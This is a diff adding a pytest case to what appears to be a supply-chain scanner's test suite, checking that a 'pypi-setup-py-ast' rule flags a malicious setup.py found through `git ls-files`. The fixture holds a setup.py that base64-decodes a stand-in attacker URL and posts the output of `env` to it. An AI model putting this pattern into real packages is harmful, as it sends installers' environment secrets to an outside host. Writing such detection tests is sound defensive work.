@@ -425,6 +425,26 @@ def test_fires_on_setup_py_exfil_cluster(tmp_path: Path) -> None:
     assert "[pypi-setup-py-ast]" in r.stdout
 
 
+
+def test_setup_py_exfil_still_fires_from_the_git_listing(tmp_path: Path) -> None:
+    """TRDD-WOI8GO1S: in a real git repo the tracked setup.py is found through `git ls-files`."""
+    (tmp_path / "setup.py").write_text(
+        "import base64\n"
+        "import requests\n"
+        "import subprocess\n"
+        "from setuptools import setup\n"
+        "exfil = base64.b64decode('aHR0cDovL2V2aWwuZXhhbXBsZS5jb20=').decode()\n"
+        "requests.post(exfil, data=subprocess.check_output(['env']))\n"
+        "setup(name='evil', version='1.0')\n",
+        encoding="utf-8",
+    )
+    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
+    subprocess.run(["git", "add", "setup.py"], cwd=tmp_path, check=True)
+    r = _run(tmp_path)
+    assert r.returncode == 0, r.stderr
+    assert "[pypi-setup-py-ast]" in r.stdout
+
+
 def test_silent_on_legitimate_setup_py(tmp_path: Path) -> None:
     """A setup.py with only `setuptools` + `os.path` is benign."""
     (tmp_path / "setup.py").write_text(
